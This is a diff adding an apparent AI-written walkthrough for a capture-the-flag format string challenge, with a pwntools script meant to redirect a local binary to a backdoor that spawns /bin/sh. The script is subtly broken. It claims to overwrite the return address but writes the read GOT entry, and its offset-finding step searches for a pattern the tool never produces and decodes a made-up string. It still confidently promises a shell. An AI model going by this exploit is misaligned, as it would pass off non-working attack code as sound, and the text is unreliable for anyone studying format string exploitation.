@@ -1,0 +1,84 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf` function. The goal is to overwrite the return address of the `main` function with the address of the `backdoor` function, which will then call `system("/bin/sh")` and give us a shell.
+
+Here are the steps and the corresponding code to achieve this:
+
+### Steps:
+1. **Identify the Vulnerability**: The `printf(buf)` call in the `while` loop is vulnerable to a format string attack.
+2. **Find the Offset**: Determine the offset at which the return address of `main` is stored on the stack.
+3. **Leak an Address**: Use the format string vulnerability to leak an address from the stack or the GOT (Global Offset Table) to defeat ASLR if it were enabled.
+4. **Overwrite the Return Address**: Use the format string vulnerability to overwrite the return address with the address of the `backdoor` function.
+
+### Code:
+```python
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.arch = 'i386'
+context.os = 'linux'
+context.endian = 'little'
+context.log_level = 'debug'
+
+# Define the binary and process
+binary_path = './fmt'
+elf = ELF(binary_path)
+p = process(binary_path)
+
+# Step 1: Identify the gift address
+p.recvuntil('gift: ')
+gift_addr = int(p.recvline().strip(), 16)
+log.info(f'Gift address: {hex(gift_addr)}')
+
+# Step 2: Find the offset
+# We can use a pattern to find the offset
+pattern = cyclic(1024)
+p.sendline(pattern)
+p.recvuntil('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa')
+offset = cyclic_find('Aa7Aa6Aa5Aa4Aa3Aa2Aa1Aa0')
+log.info(f'Offset: {offset}')
+
+# Step 3: Overwrite the return address
+# Calculate the address to write
+backdoor_addr = gift_addr
+
+# Create the payload
+payload = fmtstr_payload(offset, {elf.got['read']: backdoor_addr})
+log.info(f'Payload: {payload}')
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode
+p.interactive()
+```
+
+### Explanation:
+1. **Set Up Pwntools**:
+   - `context.arch = 'i386'`: Set the architecture to 32-bit.
+   - `context.os = 'linux'`: Set the operating system to Linux.
+   - `context.endian = 'little'`: Set the endianness to little-endian.
+   - `context.log_level = 'debug'`: Set the log level to debug for more detailed output.
+
+2. **Define the Binary and Process**:
+   - `binary_path = './fmt'`: Path to the binary.
+   - `elf = ELF(binary_path)`: Load the binary into `pwntools`.
+   - `p = process(binary_path)`: Start the process.
+
+3. **Identify the Gift Address**:
+   - `p.recvuntil('gift: ')`: Receive data until "gift: ".
+   - `gift_addr = int(p.recvline().strip(), 16)`: Read the address and convert it to an integer.
+
+4. **Find the Offset**:
+   - `pattern = cyclic(1024)`: Generate a cyclic pattern.
+   - `p.sendline(pattern)`: Send the pattern to the binary.
+   - `p.recvuntil('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa')`: Receive data until the pattern is found.
+   - `offset = cyclic_find('Aa7Aa6Aa5Aa4Aa3Aa2Aa1Aa0')`: Find the offset where the pattern starts.
+
+5. **Overwrite the Return Address**:
+   - `backdoor_addr = gift_addr`: The address of the `backdoor` function.
+   - `payload = fmtstr_payload(offset, {elf.got['read']: backdoor_addr})`: Create the payload to overwrite the `read` GOT entry with the `backdoor` address.
+   - `p.sendline(payload)`: Send the payload.
+
+6. **Interactive Mode**:
+   - `p.interactive()`: Switch to interactive mode to interact with the shell.
+
+This script should give you a shell by exploiting the format string vulnerability and overwriting the return address with the address of the `backdoor` function.
